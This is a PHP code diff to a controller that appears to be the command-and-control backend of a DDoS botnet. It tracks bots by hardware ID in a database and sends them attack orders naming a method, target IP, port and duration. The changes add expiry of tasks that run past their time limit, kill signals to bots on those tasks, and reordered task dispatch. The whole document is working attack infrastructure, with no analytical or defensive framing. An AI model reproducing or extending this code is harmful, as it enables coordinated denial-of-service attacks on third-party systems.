@@ -10,7 +10,7 @@ class ddosHandlerController{
             $result = $statement->execute(array('botid' => $_POST["hwid"]));
             $user = $statement->fetch();
             if($user !== false) {
-                if($user["active"] == 2 && $user["lastseen"] >= (time() - 5)){
+                if($user["active"] == 2 ){
                     echo "unload";
                     die();
                 }
@@ -21,21 +21,25 @@ class ddosHandlerController{
                 $statement->execute(array($_POST["hwid"], time(), $_POST["taskid"], $_POST["taskrunning"]));
             }
 
-            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM ddos_tasks WHERE executed_at >= (CURRENT_TIMESTAMP() + maxtime) ");
+            $statement = $GLOBALS["pdo"]->prepare("SELECT *, if(executed_at >= (CURRENT_TIMESTAMP() + maxtime), 'expired','active') as timelimit FROM ddos_tasks ");
             $statement->execute(array());
             while($task = $statement->fetch()) {
-                if($task["status"] != "active" && $_POST["taskid"] == $task["id"]){
+                if($task["status"] != "active" && $_POST["taskid"] == $task["id"] || $task["timelimit"] == "expired" ){
                     //Kill if it is Disabled Ignore if it is not working on the Task
                     echo "kill";
+                    $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_avalible SET lastseen = ?, ddos_taskid = ?, active = ?  WHERE botid = ?");
+                    $statement->execute(array(time(), "",  "none",$_POST["hwid"]));
                     die();
+                }else{
+                    if($task["status"] == "active" && intval($_POST["taskrunning"]) != 1 ){
+                        //Task is Active invite bot for Working
+                        $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_tasks SET executed_at = ? WHERE id = ?");
+                        $statement->execute(array(time(),$task["id"]));
+                        echo "newddos;".$task["id"].";".$task["method"].";".$task["targetip"].";".$task["port"].";".$task["maxtime"];
+                        die();
+                    }
                 }
-                if($task["status"] == "active" && intval($_POST["taskrunning"]) != 1 ){
-                    //Task is Active invite bot for Working
-                    $statement = $GLOBALS["pdo"]->prepare("UPDATE ddos_tasks SET executed_at = ? WHERE id = ?");
-                    $statement->execute(array(time(),$task["id"]));
-                    echo "newddos;".$task["id"].";".$task["method"].";".$task["targetip"].";".$task["port"].";".$task["maxtime"];
-                    die();
-                }
+
             }
         }
 
